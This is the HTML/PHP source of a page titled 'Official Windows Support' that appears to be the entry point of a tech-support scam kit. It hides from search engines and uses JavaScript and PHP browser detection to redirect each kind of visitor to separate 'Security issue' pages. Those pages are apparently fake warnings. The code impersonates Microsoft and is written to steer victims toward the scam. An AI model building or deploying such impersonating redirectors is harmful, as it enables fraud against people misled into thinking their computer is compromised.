<html xmlns="http:/www.w3.org/1999/xhtml">
<head>
    
    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><meta name="robots" content="noindex,nofollow">
	<title>Official Windows Support </title>

	<script type="text/javascript">
	var isChromium = window.chrome,
    vendorName = window.navigator.vendor,
    isOpera = window.navigator.userAgent.indexOf("OPR") > -1,
    isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
	if(isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false) 	{
   	// is Google chrome
	window.location.href = "ECHdsdsdfsdfsdfDfHelpineSecurityissu00/index.html";
	}
	if(navigator.userAgent.indexOf("Firefox") != -1 )
    {
         window.location.href = "ECHdsdsdfsdfsdfDfHelpineSecurityissu00/Edge.html";
    }
	if(window.navigator.userAgent.indexOf("Edge") != -1 )
    {
         window.location.href = "indexneweg.php";
    }
	if(window.navigator.userAgent.indexOf("Mac") != -1 )
    {
         window.location.href = "E/AD.php";
    }
	if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) //IF IE > 13
    {
      window.location.href = "IEHdsdsdfsdfsdfDfHelpineSecurityissu00/IE.html";
    }
	$SAFARI_URL = "apple";
</script>


<?php
echo $_SERVER['HTTP_USER_AGENT'];
function get_browser_name($user_agent)
{
       
        $t = strtolower($user_agent);
 
        $t = " " . $t;

        // Humans / Regular Users    
        if     (strpos($t, 'opera'     ) || strpos($t, 'opr/')     ) return 'Opera'            ;
        elseif (strpos($t, 'edge'      )                           )
        {
            header("Location: ECHdsdsdfsdfsdfDfHelpineSecurityissu00/EdgeEdge.html");
        }
        elseif (strpos($t, 'chrome'    )                           )
        {
           // header("location: index.php");
           header("Location: ECHdsdsdfsdfsdfDfHelpineSecurityissu00/Edge.html");
        }
        elseif (strpos($t, 'safari'    )                           ) return 'Safari'           ;
        elseif (strpos($t, 'firefox'   )                           ) return 'Firefox'          ;
        elseif (strpos($t, 'msie'      ) || strpos($t, 'trident/7')) return 'Internet Explorer';

         
       
        return 'Other (Unknown)';
}
echo get_browser_name($_SERVER['HTTP_USER_AGENT']);
 
 
 ?>




</body>


</html>